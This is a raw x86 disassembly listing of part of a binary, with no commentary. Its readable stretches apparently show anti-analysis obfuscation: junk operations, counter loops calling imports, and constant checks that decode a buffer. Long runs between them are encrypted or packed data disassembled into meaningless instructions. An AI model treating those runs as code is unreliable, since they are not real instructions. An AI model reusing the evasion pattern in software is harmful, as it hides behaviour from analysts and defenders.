  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	mov    ecx,0x2b4d5cd3
  407c4f:	int3   
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x1e7e7e7c
  407c57:	sub    eax,0xc0fbb5fa
  407c5c:	sub    DWORD PTR [esi-0x3096da0e],edi
  407c62:	adc    ebp,ebp
  407c64:	mov    ch,dh
  407c66:	jbe    0x407ca1
  407c68:	jp     0x407c7c
  407c6a:	(bad)  
  407c6b:	xor    BYTE PTR [ecx+ebp*2],dl
  407c6e:	sti    
  407c6f:	mov    ah,0x1f
  407c71:	loopne 0x407cbc
  407c73:	cmp    bl,BYTE PTR [edx]
  407c75:	fimul  DWORD PTR [eax+esi*2+0x10529ae8]
  407c7c:	add    DWORD PTR [eax],0x2ac63746
  407c82:	hlt    
  407c83:	jnp    0x407ca6
  407c85:	xor    ch,BYTE PTR [esi+0x35]
  407c88:	loopne 0x407c4c
  407c8a:	xchg   esp,eax
  407c8b:	mov    edx,0x8bdcaa97
  407c90:	in     eax,0x9e
  407c92:	xor    esi,DWORD PTR [esi+0x29]
  407c95:	adc    DWORD PTR [edi-0x74],0xfffffff3
  407c99:	out    dx,eax
  407c9a:	in     eax,0xfb
  407c9c:	out    dx,eax
  407c9d:	xchg   DWORD PTR [esi-0x422efcc2],eax
  407ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca4:	wbinvd 
  407ca6:	popf   
  407ca7:	mov    bl,0x40
  407ca9:	xor    al,0x48
  407cab:	inc    ebx
  407cac:	js     0x407c37
  407cae:	dec    ebp
  407caf:	or     al,0x9d
  407cb1:	push   cs
  407cb2:	jge    0x407cee
  407cb4:	or     eax,0x4acbad57
  407cb9:	fldcw  WORD PTR [esi]
  407cbb:	add    eax,edi
  407cbd:	inc    edi
  407cbe:	ja     0x407c5c
  407cc0:	(bad)  
  407cc1:	and    al,0xb
  407cc3:	sub    bh,BYTE PTR [ebx+0x37]
  407cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc7:	or     BYTE PTR [edx],0xd0
  407cca:	retf   
  407ccb:	sub    DWORD PTR [esi],ebp
  407ccd:	xchg   esi,eax
  407cce:	mov    ebp,DWORD PTR [ebx+ebp*8-0x2977dae]
  407cd5:	addr16 popa 
  407cd7:	cdq    
  407cd8:	lods   eax,DWORD PTR ds:[esi]
  407cd9:	mov    bh,0x8
  407cdb:	jnp    0x407d56
  407cdd:	ja     0x407cd7
  407cdf:	(bad)  
  407ce0:	loopne 0x407ccc
  407ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce3:	xchg   edx,eax
  407ce4:	sahf   
  407ce5:	mov    ah,0xf0
  407ce7:	jmp    0x5785:0x71671725
  407cee:	sbb    DWORD PTR [esi-0x27],ebx
  407cf1:	add    ecx,DWORD PTR ds:0x4ff625fa
  407cf7:	into   
  407cf8:	mov    eax,ds:0xfd2d9ec6
  407cfd:	sub    DWORD PTR [esi+0x8],esi
  407d00:	mov    edx,0xbba96f5d
  407d05:	shl    DWORD PTR ds:0x68df15fa,cl
  407d0b:	in     al,0x14
  407d0d:	js     0x407d7b
  407d0f:	lea    edi,[eax]
  407d11:	scas   eax,DWORD PTR es:[edi]
  407d12:	iret   
  407d13:	loop   0x407cc8
  407d15:	addr16 std 
  407d17:	dec    edx
  407d18:	(bad)  
  407d19:	adc    eax,0x575388bf
  407d1e:	dec    ebp
  407d1f:	sub    BYTE PTR [eax],dl
  407d21:	mov    al,ds:0x73a61de4
  407d26:	xchg   edi,eax
  407d27:	pop    ebp
  407d28:	xchg   ebp,eax
  407d29:	jnp    0x407d3a
  407d2b:	(bad)  [esp+ebp*4]
  407d2e:	(bad)
  407d32:	pushf  
  407d33:	cdq    
  407d34:	sub    cl,BYTE PTR [eax+0x1fcd2d1a]
  407d3a:	jne    0x407d04
  407d3c:	mov    ds:0x8bb58973,eax
  407d41:	xchg   edi,eax
  407d42:	sbb    edi,edi
  407d44:	sub    al,0xbc
  407d46:	lods   al,BYTE PTR ds:[esi]
  407d47:	xchg   bp,ax
  407d49:	test   WORD PTR [eax+0x59],dx
  407d4d:	arpl   WORD PTR [ebx+0x53],bp
  407d50:	xchg   ebp,eax
  407d51:	in     eax,0x24
  407d53:	clc    
  407d54:	dec    edx
  407d55:	jne    0x407cfa
  407d57:	adc    eax,0xbccbdc31
  407d5c:	dec    ebx
  407d5d:	adc    al,0x34
  407d5f:	jmp    0x407d94
  407d61:	lds    ecx,FWORD PTR [edx-0x78]
  407d64:	pop    edx
  407d65:	pop    esi
  407d66:	mov    dl,0x5d
  407d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d69:	and    DWORD PTR [esi+0x1a7075bf],0x63
  407d70:	inc    ecx
  407d71:	push   ss
  407d72:	and    edx,DWORD PTR [ebx-0x77]
  407d75:	jbe    0x407dd7
  407d77:	xchg   ebp,eax
  407d78:	ja     0x407daa
  407d7a:	adc    eax,0x77c0db07
  407d7f:	xor    BYTE PTR [edx+0x387a65c],bh
  407d85:	leave  
  407d86:	xchg   ebp,eax
  407d87:	repnz cdq 
  407d89:	add    edx,DWORD PTR [ecx-0x2d]
  407d8c:	add    bl,ah
  407d8e:	fistp  QWORD PTR [edx]
  407d90:	ror    esi,cl
  407d92:	jmp    0xd106:0xf38c735f
  407d99:	and    ebx,DWORD PTR [edx-0x72]
  407d9c:	xchg   edx,eax
  407d9d:	cmp    al,0x7
  407d9f:	aad    0x5e
  407da1:	call   edi
  407da3:	dec    esi
  407da4:	test   eax,0xe24e8aec
  407da9:	add    BYTE PTR [edi],al
  407dab:	push   DWORD PTR [ebx-0x53]
  407dae:	push   edi
  407daf:	add    al,0x44
  407db1:	lea    edx,[ebx+0x34227bbc]
  407db7:	jle    0x407db5
  407db9:	add    eax,0x1102bcf4
  407dbe:	pusha  
  407dbf:	test   BYTE PTR [ebx],bh
  407dc1:	or     ecx,edx
  407dc3:	mov    ebp,0xd2b4240b
  407dc8:	fisubr WORD PTR [ecx]
  407dca:	mov    ebp,DWORD PTR [esi]
  407dcc:	jno    0x407d92
  407dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dcf:	stos   DWORD PTR es:[edi],eax
  407dd0:	mov    DWORD PTR [eax],edx
  407dd2:	xor    ch,BYTE PTR [edx]
  407dd4:	add    BYTE PTR [ecx+0x239764f7],0xcc
  407ddb:	mov    edi,0x86f26576
  407de0:	jecxz  0x407dc7
  407de2:	adc    dl,BYTE PTR [edx]
  407de4:	mov    ecx,0x67bda196
  407de9:	in     al,dx
  407dea:	inc    eax
  407deb:	cli    
  407dec:	stc    
  407ded:	fisttp DWORD PTR [eax]
  407def:	adc    BYTE PTR [eax+eax*2-0x5f],0xe6
  407df4:	fcom   DWORD PTR [ebx+eiz*8]
  407df7:	mov    ecx,DWORD PTR [edx+0x37]
  407dfa:	jo     0x407da4
  407dfc:	pop    es
  407dfd:	test   eax,0xa24c2f78
  407e02:	mov    ah,ah
  407e04:	add    ebp,DWORD PTR [eax+ecx*8]
  407e07:	push   edx
  407e08:	arpl   WORD PTR [edi],di
  407e0a:	sub    eax,DWORD PTR [edi-0x527098b8]
  407e10:	xchg   DWORD PTR [ecx],esi
  407e12:	pop    ss
  407e13:	test   al,0xfb
  407e15:	dec    esi
  407e16:	add    al,0x43
  407e18:	xor    ah,BYTE PTR [ebx+0x15cfaf29]
  407e1e:	sbb    ch,BYTE PTR [esi+0x437ab44b]
  407e24:	jmp    0x34ac:0xe4e89dff
  407e2b:	mov    ds:0xc857a8c4,al
  407e30:	and    eax,0x97af30ba
  407e35:	push   ecx
  407e36:	sbb    BYTE PTR [eax],al
  407e38:	fisub  WORD PTR [esi+0x12e87fd6]
  407e3e:	rcl    BYTE PTR [eax],1
  407e40:	ret    
  407e41:	jle    0x407ea9
  407e43:	sub    BYTE PTR [eax+0x16],ch
  407e46:	pop    esp
  407e47:	xchg   edi,eax
  407e48:	icebp  
  407e49:	iret   
  407e4a:	xchg   ebx,eax
  407e4b:	popf   
  407e4c:	or     eax,0xc9d4032f
  407e51:	in     eax,dx
  407e52:	jp     0x825c0901
  407e58:	cmp    al,BYTE PTR [ebx+0x11c4c0ce]
  407e5e:	out    dx,al
  407e5f:	cmp    eax,0x8b1089d5
  407e64:	inc    ebp
  407e65:	hlt    
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xb0e7e20d
  408191:	cmp    DWORD PTR [esi],0x247e7eca
  408197:	jl     0x408217
  408199:	jle    0x408184
  40819b:	fsub   DWORD PTR [ebp-0xa]
  40819e:	js     0x4081d5
  4081a0:	mov    eax,0x6b5293af
  4081a5:	je     0x408221
  4081a7:	ret    
  4081a8:	pop    esp
  4081a9:	lea    ecx,[edi+0x2a13d30d]
  4081af:	mov    esp,0x97714d10
  4081b4:	jo     0x40820a
  4081b6:	sub    al,0x65
  4081b8:	cmp    BYTE PTR [esi],bh
  4081ba:	sbb    BYTE PTR [ecx+edx*4+0x67],ah
  4081be:	push   0xffffffa8
  4081c0:	test   al,0x45
  4081c2:	fs mov al,0xf8
  4081c5:	pop    eax
  4081c6:	gs cli 
  4081c8:	loop   0x40823b
  4081ca:	int3   
  4081cb:	lods   eax,DWORD PTR ds:[esi]
  4081cc:	and    eax,0x9829fa5f
  4081d1:	jae    0x408184
  4081d3:	push   edx
  4081d4:	nop
  4081d5:	pop    esp
  4081d6:	inc    ebx
  4081d7:	add    al,0x77
  4081d9:	or     cl,BYTE PTR [edx-0x6d]
  4081dc:	cwde   
  4081dd:	(bad)  
  4081de:	xor    BYTE PTR ds:0x9caa9117,bh
  4081e4:	push   edi
  4081e5:	out    dx,al
  4081e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e7:	cmp    al,0x32
  4081e9:	fisub  DWORD PTR [edx+0x58]
  4081ec:	rcr    DWORD PTR [esi+0x1e],0xa5
  4081f0:	pusha  
  4081f1:	into   
  4081f2:	jae    0x4081f8
  4081f4:	lea    esp,[ebx]
  4081f6:	in     eax,0xaa
  4081f8:	(bad)  
  4081f9:	fucom  st(5)
  4081fb:	(bad)  
  4081fc:	leave  
  4081fd:	aad    0xa9
  4081ff:	shr    dl,1
  408201:	or     DWORD PTR [ecx+0x32],ebx
  408204:	arpl   WORD PTR [edi+0x6ef1287d],di
  40820a:	jne    0x4081bd
  40820c:	mov    al,0x35
  40820e:	inc    esp
  40820f:	jg     0x408258
  408211:	push   0xfffffff0
  408213:	loope  0x4081c2
  408215:	loopne 0x4081cf
  408217:	dec    eax
  408218:	hlt    
  408219:	add    edx,DWORD PTR [ecx]
  40821b:	out    0xae,eax
  40821d:	mov    ds:0xf1a86e28,al
  408222:	test   DWORD PTR [ecx-0x2b],edi
  408225:	adc    al,0x31
  408227:	push   esi
  408228:	mov    bh,0x51
  40822a:	adc    esp,DWORD PTR [ebx+edi*8]
  40822d:	jne    0x408213
  40822f:	test   al,0x45
  408231:	fwait
  408232:	xor    bh,ch
  408234:	cmp    al,0xba
  408236:	call   0x783f:0x28b7de56
  40823d:	fcom   QWORD PTR [edx-0x69]
  408240:	sbb    esp,eax
  408242:	dec    ecx
  408243:	outs   dx,DWORD PTR ds:[esi]
  408244:	and    eax,0x9f24e69a
  408249:	push   0x6e9ef9a
  40824e:	jb     0x40829b
  408250:	pushf  
  408251:	lock xchg esi,eax
  408253:	bnd jnp 0x4082b4
  408256:	scas   eax,DWORD PTR es:[edi]
  408257:	or     bl,cl
  408259:	mov    BYTE PTR [ebx+0x4d],bl
  40825c:	xor    eax,0x3d58f8e4
  408261:	push   es
  408262:	mov    ds:0xb6493997,eax
  408267:	ins    DWORD PTR es:[edi],dx
  408268:	fldcw  WORD PTR [ebp+0xfd2caac]
  40826e:	shl    DWORD PTR [esi-0x6ebad625],cl
  408274:	out    0x3,al
  408276:	mov    bh,BYTE PTR [ebx-0x60]
  408279:	mov    ds:0x9531e0d9,al
  40827e:	cmp    edi,DWORD PTR [edx]
  408280:	mov    cl,0xc7
  408282:	fnstsw WORD PTR [ecx-0x80]
  408285:	cs cli 
  408287:	sahf   
  408288:	mov    dh,0xf
  40828a:	sar    BYTE PTR [esi-0x3090d4d0],0x20
  408291:	ja     0x408310
  408293:	inc    DWORD PTR [ebp-0x4015c0d0]
  408299:	pusha  
  40829a:	retf   
  40829b:	outs   dx,BYTE PTR ds:[esi]
  40829c:	lds    ebp,FWORD PTR [edx]
  40829e:	fdivr  QWORD PTR [bp+si-0xb54]
  4082a3:	neg    al
  4082a5:	sub    eax,0x69932467
  4082aa:	push   0xfd35d479
  4082af:	or     DWORD PTR [ebp-0x7eaa0c29],0x7d
  4082b6:	push   ecx
  4082b7:	leave  
  4082b8:	sub    eax,0x69111d44
  4082bd:	bnd ret 0x6c13
  4082c1:	sbb    eax,0x109cd3a4
  4082c6:	and    ch,bh
  4082c8:	xor    eax,0x3627971c
  4082cd:	mov    WORD PTR [edi+0x650c6531],fs
  4082d3:	mov    dl,cl
  4082d5:	ss fsubr st,st(2)
  4082d8:	pop    ebp
  4082d9:	call   0xe2fbddc6
  4082de:	and    ebx,DWORD PTR [esi+0x33604382]
  4082e4:	clc    
  4082e5:	dec    eax
  4082e6:	out    dx,al
  4082e7:	xchg   BYTE PTR [eax-0x3b031f4f],dl
  4082ed:	dec    ecx
  4082ee:	add    al,al
  4082f0:	pop    eax
  4082f1:	jno    0x408362
  4082f3:	into   
  4082f4:	dec    ebp
  4082f5:	sar    DWORD PTR [eax+0x7f],1
  4082f8:	iret   
  4082f9:	test   BYTE PTR es:[ebx-0x53],bl
  4082fd:	xchg   edi,eax
  4082fe:	inc    esp
  4082ff:	div    BYTE PTR [edx+0x566a25d5]
  408305:	dec    esp
  408306:	cmp    eax,0xf106748
  40830b:	adc    al,0xf9
  40830d:	ss test esi,eax
  408310:	inc    ebp
  408311:	loopne 0x40829e
  408313:	cdq    
  408314:	xchg   edx,eax
  408315:	jecxz  0x4082bf
  408317:	(bad)  
  408318:	mov    BYTE PTR [ecx-0x294576f5],bl
  40831e:	fisttp WORD PTR [ecx+0x41ec1ea2]
  408324:	dec    ebx
  408325:	ins    BYTE PTR es:[edi],dx
  408326:	mov    esi,0xf2dcdf17
  40832b:	idiv   edx
  40832d:	mov    al,ds:0xe8431d6f
  408332:	mov    ebx,0xe9678b5c
  408337:	push   edx
  408338:	neg    DWORD PTR [ebx]
  40833a:	add    ebx,DWORD PTR [esi+0x3a92d5b0]
  408340:	repz sahf 
  408342:	pop    DWORD PTR [edi+0x19b74e88]
  408348:	jb     0x40837a
  40834a:	jnp    0x4082de
  40834c:	test   cl,al
  40834e:	mov    ds:0xf5235c70,al
  408353:	jl     0x4083c0
  408355:	sbb    ebx,DWORD PTR [ebx-0xa]
  408358:	jns    0x40838d
  40835a:	ss out dx,eax
  40835c:	xchg   edx,eax
  40835d:	mov    bh,0x48
  40835f:	ds aaa 
  408361:	and    ebp,DWORD PTR [ecx]
  408363:	mov    ecx,?
  408365:	pusha  
  408366:	ins    DWORD PTR es:[edi],dx
  408367:	lods   al,BYTE PTR ds:[esi]
  408368:	mov    ebp,0x2b8aa6f5
  40836d:	push   edi
  40836e:	cmp    DWORD PTR ds:0x82757aa9,edi
  408374:	cld    
  408375:	adc    al,0x7b
  408377:	shl    edi,0x7a
  40837a:	mov    WORD PTR [edx+eax*2],?
  40837d:	int    0xba
  40837f:	repz adc eax,0x2b43a207
  408385:	pop    esi
  408386:	jbe    0x4083e2
  408388:	(bad)  
  408389:	pop    ebx
  40838a:	pop    esi
  40838b:	xor    DWORD PTR [edi+0x4d22c88f],edx
  408391:	jmp    0x1b8b:0x49bf93a1
  408398:	xlat   BYTE PTR ds:[ebx]
  408399:	push   ss
  40839a:	push   ecx
  40839b:	loop   0x4083ef
  40839d:	loopne 0x4083ed
  40839f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083a0:	int3   
  4083a1:	and    al,0xba
  4083a3:	cdq    
  4083a4:	pushf  
  4083a5:	mov    edx,0xe92cdc41
  4083aa:	adc    dh,0x35
  4083ad:	push   cs
  4083ae:	icebp  
  4083af:	scas   al,BYTE PTR es:[edi]
  4083b0:	call   0x1d6aef32
  4083b5:	cmp    DWORD PTR [esi+0x474e7423],eax
  4083bb:	cdq    
  4083bc:	push   0x18
  4083be:	push   ecx
  4083bf:	sub    BYTE PTR [ebx+0x58],bl
  4083c2:	loop   0x4083fb
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43375b,0x0
  4083d1:	mov    eax,ds:0x43375b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	std    
  408465:	sbb    BYTE PTR [edx],0xf1
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	sub    al,0x45
  408472:	(bad)  
  408473:	jno    0x408493
  408475:	add    edx,esi
  408477:	push   es
  408478:	fistp  QWORD PTR [eax+0x62a0e0e7]
  40847e:	mov    bh,0x2f
  408480:	xchg   edx,eax
  408481:	fcom   DWORD PTR [ebp+0x7cb8a6eb]
  408487:	popf   
  408488:	shl    BYTE PTR [eax-0x79],cl
  40848b:	mov    al,0x3b
  40848d:	jmp    0x5195:0xa60db692
  408494:	mov    al,0xdc
  408496:	jnp    0x4084b8
  408498:	add    eax,0xa14c6163
  40849d:	push   ss
  40849e:	dec    eax
  40849f:	fadd   st,st(6)
  4084a1:	out    0xf3,eax
  4084a3:	gs jmp 0x4084c7
  4084a6:	ja     0x4084b8
  4084a8:	gs pop esp
  4084aa:	pmulhuw mm0,QWORD PTR [ebx]
  4084ad:	retf   
  4084ae:	adc    DWORD PTR [edx+0x78be7f70],ebp
  4084b4:	out    0xa8,al
  4084b6:	xor    DWORD PTR [eax+0x4497e76],edx
  4084bc:	int3   
  4084bd:	in     eax,0x75
  4084bf:	jmp    0x922b:0x8b47f6ca
  4084c6:	aaa    
  4084c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084c8:	out    0xec,al
  4084ca:	pop    ss
  4084cb:	retf   
  4084cc:	popa   
  4084cd:	sbb    BYTE PTR [ebx+0x3b37fb50],bh
  4084d3:	add    al,0xb4
  4084d5:	mov    ecx,0xc7afe6f9
  4084da:	jbe    0x4084ba
  4084dc:	(bad)  [esi+0x76]
  4084df:	push   ds
  4084e0:	mov    cl,0x75
  4084e2:	jae    0x408493
  4084e4:	dec    edx
  4084e5:	data16 mov bl,0xb1
  4084e8:	jne    0x408565
  4084ea:	pop    ecx
  4084eb:	rol    ch,0x71
  4084ee:	(bad)  
  4084ef:	lock pop edx
  4084f1:	(bad)  
  4084f2:	in     eax,0x22
  4084f4:	dec    eax
  4084f5:	mov    esp,0xca3fbc98
  4084fa:	jb     0x4084c3
